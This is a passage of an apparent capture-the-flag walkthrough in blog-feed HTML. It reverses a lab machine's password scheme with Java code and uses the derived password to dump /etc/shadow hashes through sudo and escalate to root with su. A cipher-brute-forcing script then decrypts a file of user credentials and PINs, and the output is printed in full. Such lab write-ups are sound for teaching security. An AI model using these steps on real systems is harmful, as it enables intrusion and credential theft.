-</span><span class='line'>     <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">backLoop</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">){</span>
-</span><span class='line'>       <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
-</span><span class='line'>       <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="n">input</span><span class="o">[</span><span class="mi">1</span><span class="o">];</span> <span class="kt">int</span> <span class="n">b</span><span class="o">=</span><span class="n">input</span><span class="o">[</span><span class="n">ref</span><span class="o">-</span><span class="mi">1</span><span class="o">];</span>
-</span><span class='line'>       <span class="kt">int</span> <span class="n">check</span><span class="o">=(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">)/</span><span class="mi">2</span><span class="o">;</span>
-</span><span class='line'>
-</span><span class='line'>       <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">ref</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
-</span><span class='line'>         <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]%</span><span class="n">check</span><span class="o">)+(</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="o">);</span>
-</span><span class='line'>         <span class="k">else</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="o">);}</span>
-</span><span class='line'>     <span class="k">return</span> <span class="n">input</span><span class="o">;}</span>
-</span><span class='line'>
-</span><span class='line'>     <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">loopBack</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">){</span>
-</span><span class='line'>       <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">/</span><span class="mi">2</span><span class="o">;</span>
-</span><span class='line'>       <span class="kt">int</span><span class="o">[]</span> <span class="n">encNew</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">+</span><span class="n">ref</span><span class="o">];</span>
-</span><span class='line'>       <span class="kt">int</span> <span class="n">ch</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span>
-</span><span class='line'>       <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=(</span><span class="n">ref</span><span class="o">/</span><span class="mi">2</span><span class="o">);</span><span class="n">i</span><span class="o">&lt;</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
-</span><span class='line'>         <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="n">input</span><span class="o">[</span><span class="n">ch</span><span class="o">];</span> <span class="n">ch</span><span class="o">++;}</span>
-</span><span class='line'>         <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">encNew</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
-</span><span class='line'>           <span class="k">if</span><span class="o">(</span><span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]&lt;=</span><span class="mi">33</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="mi">33</span><span class="o">+(++</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="o">);</span>
-</span><span class='line'>           <span class="k">else</span> <span class="nf">if</span><span class="o">(</span><span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]&gt;=</span><span class="mi">126</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="mi">126</span><span class="o">-(--</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="o">);</span>
-</span><span class='line'>           <span class="k">else</span><span class="o">{</span>
-</span><span class='line'>             <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]-=(</span><span class="n">i</span><span class="o">%</span><span class="mi">3</span><span class="o">);</span>
-</span><span class='line'>             <span class="k">else</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]+=(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">);}}</span>
-</span><span class='line'>     <span class="k">return</span> <span class="n">encNew</span><span class="o">;}</span>
-</span><span class='line'>
-</span><span class='line'>     <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">loopProcess</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
-</span><span class='line'>       <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
-</span><span class='line'>         <span class="k">if</span><span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">40</span><span class="o">||</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">41</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
-</span><span class='line'>         <span class="k">else</span> <span class="nf">if</span><span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">45</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+=</span><span class="mi">20</span><span class="o">+</span><span class="n">i</span><span class="o">;}</span>
-</span><span class='line'>     <span class="k">return</span> <span class="n">input</span><span class="o">;}</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
-</span><span class='line'>        <span class="kt">int</span><span class="o">[]</span> <span class="n">a</span> <span class="o">=</span> <span class="n">processLoop</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
-</span><span class='line'>        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">a</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
-</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">((</span><span class="kt">char</span><span class="o">)</span> <span class="n">a</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
-</span><span class='line'>        <span class="o">}</span>
-</span><span class='line'>        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">();</span>
-</span><span class='line'>    <span class="o">}</span>
-</span><span class='line'><span class="o">}</span>
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'><span class="n">root</span><span class="nd">@kali32</span><span class="o">:~</span><span class="err">#</span> <span class="n">javac</span> <span class="n">test</span><span class="o">.</span><span class="na">java</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We encrypt another usernames to get passwords.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# java test sysadmin
-</span><span class='line'>7531/{{tor/rv/A
-</span><span class='line'>root@kali32:~# java test root
-</span><span class='line'>31/Fwxw+2</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Now we can log as sysadmin. Using sudo:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>User sysadmin may run the following commands on this host:
-</span><span class='line'>    (root) NOEXEC: /bin/ls
-</span><span class='line'>    (root) NOEXEC: /usr/bin/cat
-</span><span class='line'>    (root) NOEXEC: /usr/bin/more
-</span><span class='line'>    (root) NOEXEC: !/usr/bin/su *root*</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>sysadmin@slax:~$ sudo cat /etc/shadow 
-</span><span class='line'>root:$1$vEElgVNe$9nK8G715PgmFE4g1QyTII0:13553:0:::::
-</span><span class='line'>bin:*:9797:0:::::
-</span><span class='line'>daemon:*:9797:0:::::
-</span><span class='line'>adm:*:9797:0:::::
-</span><span class='line'>lp:*:9797:0:::::
-</span><span class='line'>sync:*:9797:0:::::
-</span><span class='line'>shutdown:*:9797:0:::::
-</span><span class='line'>halt:*:9797:0:::::
-</span><span class='line'>mail:*:9797:0:::::
-</span><span class='line'>news:*:9797:0:::::
-</span><span class='line'>uucp:*:9797:0:::::
-</span><span class='line'>operator:*:9797:0:::::
-</span><span class='line'>games:*:9797:0:::::
-</span><span class='line'>ftp:*:9797:0:::::
-</span><span class='line'>smmsp:*:9797:0:::::
-</span><span class='line'>mysql:*:9797:0:::::
-</span><span class='line'>rpc:*:9797:0:::::
-</span><span class='line'>sshd:*:9797:0:::::
-</span><span class='line'>gdm:*:9797:0:::::
-</span><span class='line'>pop:*:9797:0:::::
-</span><span class='line'>nobody:*:9797:0:::::
-</span><span class='line'>sysadmin:$1$Nj4nHA2G$JbByYpmcxsXEiWAUObt1n0:13550:0:99999:7:::
-</span><span class='line'>csadmin:$1$fL53QS96$x94h96zABA9MrbISq7VtZ1:13550:0:99999:7:::
-</span><span class='line'>sdadmin:$1$hL8T9Cgk$0g4u8UgtkMn11OJ7sjsK00:13550:0:99999:7:::
-</span><span class='line'>dbadmin:$1$dQwfzffm$kIXUGVFu3XZmm4jZNp6wa1:13550:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Because we are in wheel group, we can invoke the command &lsquo;su&rsquo; directly to obtain the root access:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>sysadmin@slax:~$ id
-</span><span class='line'>uid=1000(sysadmin) gid=10(wheel) groups=10(wheel)
-</span><span class='line'>sysadmin@slax:~$ su
-</span><span class='line'>Password: *********
-</span><span class='line'>root@slax:/home/sysadmin#</span></code></pre></td></tr></table></div></figure>
-
-
-<p>From the home directory of sysadmin user, we locate the encrypted file in ftp and use
-script for decryption, with the password of the root user:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:~# cat /home/sysadmin/Note_to_self 
-</span><span class='line'>Note:
-</span><span class='line'>useracc_update.csv file has been moved to the ftp server and encrypted 
-</span><span class='line'>for transfer to dbadmin's account.  These are only the updated values 
-</span><span class='line'>for reference in the database.  
-</span><span class='line'>We need to tailor to our new customers for the New Year!</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@slax:/home/ftp/incoming# cat crack-openssl.sh
-</span><span class='line'><span class="c">#!/usr/bin/env bash</span>
-</span><span class='line'>
-</span><span class='line'>mkdir csv
-</span><span class='line'><span class="nv">ciphers</span><span class="o">=</span><span class="sb">`</span>openssl list-cipher-commands<span class="sb">`</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">for</span> c in <span class="nv">$ciphers</span><span class="p">;</span> <span class="k">do</span>
-</span><span class='line'>  openssl enc -d -<span class="s2">&quot;$c&quot;</span> -in useracc_update.csv.enc -k <span class="s2">&quot;31/Fwxw+2&quot;</span> -out csv/useracc_update.csv.<span class="nv">$c</span>-decrypted 2&gt;/dev/ull
-</span><span class='line'><span class="k">done</span>
-</span><span class='line'>strings -n <span class="m">12</span> csv/*
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:/home/ftp/incoming# ./crack-openssl.sh   
-</span><span class='line'>ID,Last,First,Email,State,Username,Password,Verifacation Code,Pin code
-</span><span class='line'>1000,Carr,Alfred,acarr23@gmail.com,NY,acarr9096,phantom4,952733,490
-</span><span class='line'>1001,Karson,William,wkarson53@yahoo.com,NY,wkarson2431,rockallday123,567094,345
-</span><span class='line'>1002,Wheeler,Cordy,megawheels98@rocketmail.com,NY,cwheeler5031,goeagles90,462724,631
-</span><span class='line'>1003,Smith,Ken,synthesizer_1r@gmail.com,NY,ksmith6253,crystalization,636721,353
-</span><span class='line'>1004,Quinn,Cynthia,qcq92@aol.com,NY,cquinn1217,archyandhenry,680247,223
-</span><span class='line'>1005,Floyd,Wilson,jukeboxer_4life@gmail.com,NY,wfloyd5931,knockout66,521456,441
-</span><span class='line'>1006,Blake,Markus,sil3nt_gunn3r@yahoo.com,NY,mblake6947,268768924,129632,557
-</span><span class='line'>1007,Nash,Jillian,wiselife141@aol.com,NY,jnash0934,checkitout1,324672,315
-</span><span class='line'>1008,Atkins,Alison,double_a44@hotmail.com,NY,aatkins9087,gogogo123123,457094,124
-</span><span class='line'>1009,Oliver,Frank,fog_of_war0001@gmail.com,NY,foliver9385,falconpunch,783143,134
-</span><span class='line'>1010,Jones,Edith,msjones677@hotmail.com,NY,ejones7532,chris12345,632620,579
-</span><span class='line'>1011,Moore,Cody,aiprojectx@gmail.com,NY,dot_Cipher,crypTrace,101010,1337</span></code></pre></td></tr></table></div></figure>
 
 ]]></content>
   </entry>
